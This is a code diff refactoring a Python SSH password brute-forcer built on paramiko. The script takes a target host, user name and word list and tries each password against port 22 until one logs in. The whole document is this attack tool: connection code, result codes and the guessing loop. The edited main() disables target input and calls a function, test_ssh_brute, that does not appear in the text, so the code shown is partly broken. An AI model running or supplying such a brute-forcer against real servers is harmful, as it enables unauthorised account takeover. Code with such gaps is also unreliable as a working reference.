@@ -1,10 +1,20 @@
 import paramiko, sys, os, socket
+from enum import Enum
 
-g_host = g_user_name = g_word_list = ""
+class Code(Enum):
+	AUTHENTICATION_SUCCESSFUL = 0
+	AUTHENTICATION_EXCEPTION = 1
+	SSH_EXCEPTION = 2
+	SOCKET_ERROR = 3
+
 line = "\n------------------------------------------------------\n"
+g_host = g_user_name = g_word_list = ""
 SSH_PORT = 22
 
-# get the details of the SSH server from the user
+
+"""
+	get the details of the SSH server from the user
+"""
 def get_target_details():
 	global g_host, g_user_name, g_word_list
 	try:
@@ -21,22 +31,10 @@ def get_target_details():
 		print("\n [*] Program has been interrupted at your request")
 		sys.exit(2)
 
-# "\n------------------------------------------------------\n"
 
-def test_get_details():
-	print("IP: ", g_host)
-	print("User: ", g_user_name)
-	print("path: ", g_word_list)
-
-	print("\n-----word list contents-----")
-	wrd_lst = open(g_word_list, "r")
-
-	for password in wrd_lst.readlines():
-		password = password.strip("\n")
-		print(password)
-
-
-# connect to the SSH server with the password passed as arg
+"""
+	connect to the SSH server with the password passed as arg
+"""
 def connect_ssh(password):
 	global g_host, g_user_name, g_word_list
 
@@ -49,22 +47,25 @@ def connect_ssh(password):
 	# connect to the host with password retreived from the word list
 	try:
 		client_ssh.connect(g_host, SSH_PORT, g_user_name, password)
-		code = 0	# successful connection
+		code = Code.AUTHENTICATION_SUCCESSFUL	# successful connection
 
 	except paramiko.AuthenticationException:
-		code = 1	# invalid credentials
+		code = Code.AUTHENTICATION_EXCEPTION	# failed authentication
 
 	except paramiko.SSHException:
-		code = 2	# error in connecting or establishing an ssh connection
+		code = Code.SSH_EXCEPTION				# error in connecting or establishing an ssh connection
 
 	except socket.error:
-		code = 3	# socket error while connecting
+		code = Code.SOCKET_ERROR				# socket error while connecting
 
 	else:
 		client_ssh.close()
-		return code
 
+	return code
 
+"""
+	tries out all the passwords in a file
+"""
 def ssh_brute_forcer_simple():
 	global g_host, g_user_name, g_word_list
 
@@ -78,29 +79,28 @@ def ssh_brute_forcer_simple():
 		try:
 			response = connect_ssh(password)
 
-			if (response == 0):
+			# we were able to connect successfuly to the target
+			if (response == Code.AUTHENTICATION_SUCCESSFUL):
 				print("{0}[*] Password found\n[*] Password: {1} {0}".format(line, password))
 				sys.exit(0)
 
-			elif (response == 1):
-				print("[*] Incorrect password: {0} \n", password)
+			# authentication failed
+			elif (response == Code.AUTHENTICATION_EXCEPTION):
+				print("[*] Authentication failed with password: ", password)
 
-			elif (response == 2):
-				print("[*] Unable to establish a connection to the target\n")
+			# error in connecting or establishing an ssh connection
+			elif (response == Code.SSH_EXCEPTION):
+				print("[*] Unable to establish a connection to the target.\n")
 				sys.exit(2)
 
-			elif (response == 3):
-				print("socket.error")
+			# socket error while connecting
+			elif (response == Code.SOCKET_ERROR):
+				print("[*] socket.error")
 				sys.exit(3)
 
 		except KeyboardInterrupt:
 			print("\n [*] Program has been interrupted at your request")
 			sys.exit(2)
-
-		except Exception as e:
-			print(e)
-			sys.exit(3)
-
 
 	# no passwords matched
 	file_words.close()
@@ -109,9 +109,11 @@ def ssh_brute_forcer_simple():
 
 def main():
 
-	get_target_details()
+	#get_target_details()
 	#test_get_details()
+	test_ssh_brute()
 	ssh_brute_forcer_simple()
 
 if __name__ == "__main__":
 	main()
+
